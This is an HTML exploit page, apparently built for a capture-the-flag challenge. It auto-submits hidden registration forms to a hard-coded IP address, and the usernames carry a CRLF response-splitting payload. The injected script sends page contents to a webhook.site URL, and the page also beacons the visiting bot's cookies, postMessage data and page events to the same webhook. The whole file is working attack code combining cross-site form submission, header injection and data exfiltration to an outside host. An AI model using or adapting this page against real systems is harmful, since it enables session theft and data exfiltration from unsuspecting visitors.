<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Long Wait Test</title>
</head>
<body>
    <h1>Testing... Please wait 30 seconds...</h1>
    
    <iframe name="reg" style="display:none;"></iframe>
    
    <script>
    var WEBHOOK = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // === CRLF Payload with Image beacon (CSP 우회 불필요) ===
    var crlfPayload = 
        "\r\n" +
        "Content-Length: 0\r\n" +
        "\r\n" +
        "HTTP/1.1 200 OK\r\n" +
        "Content-Type: text/html\r\n" +
        "\r\n" +
        "<html><body>" +
        "<h1>CRLF INJECTED!</h1>" +
        "<img src='https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81?trigger=crlf_success&data=INJECTED' style='display:none'>" +
        "<script>" +
        "var data=document.body.innerHTML;" +
        "navigator.sendBeacon('https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81',data);" +
        "</scr"+"ipt>" +
        "</body></html>";
    
    // === FLAG 후보 ===
    var flags = [
        'ASIS{bookmarks}',
        'ASIS{crlf}',
        'ASIS{http_response_splitting}',
        'ASIS{admin}'
    ];
    
    // === 등록 ===
    flags.forEach(function(f, i) {
        setTimeout(function() {
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://65.109.202.184/register';
            form.target = 'reg';
            
            var u = document.createElement('input');
            u.name = 'username';
            u.value = f + crlfPayload;
            
            var p = document.createElement('input');
            p.name = 'password';
            p.value = 'password';
            
            form.appendChild(u);
            form.appendChild(p);
            document.body.appendChild(form);
            form.submit();
        }, i * 100);
    });
    
    // === 매우 세밀한 타이밍 추적 ===
    navigator.sendBeacon(WEBHOOK, 'T0: Page loaded');
    
    for (var i = 1; i <= 30; i++) {
        (function(sec) {
            setTimeout(function() {
                navigator.sendBeacon(WEBHOOK, 'T' + sec + ': ' + sec + ' seconds elapsed');
            }, sec * 1000);
        })(i);
    }
    
    // === 모든 이벤트 추적 ===
    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: beforeunload');
    });
    
    window.addEventListener('pagehide', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: pagehide');
    });
    
    document.addEventListener('visibilitychange', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: visibility=' + document.visibilityState);
    });
    
    // === postMessage 리스너 ===
    window.addEventListener('message', function(event) {
        navigator.sendBeacon(WEBHOOK, 'POST_MESSAGE: origin=' + event.origin + ', data=' + JSON.stringify(event.data));
    });
    
    // === 30초 후 최종 상태 ===
    setTimeout(function() {
        var finalData = {
            timestamp: new Date().toISOString(),
            message: 'TEST COMPLETE - 30 seconds elapsed',
            cookies: document.cookie,
            localStorage: Object.keys(localStorage).length,
            url: window.location.href
        };
        navigator.sendBeacon(WEBHOOK, JSON.stringify(finalData));
    }, 30000);
    
    // === 중요: Meta refresh 없음! ===
    // 이 페이지는 그냥 30초 동안 대기만 합니다.
    // 봇이 어떤 동작을 하는지 관찰합니다.
    // 혹시 봇이 나중에 dashboard를 방문하면,
    // CRLF injection이 trigger되어 webhook에 신호가 올 것입니다!
    </script>
</body>
</html>
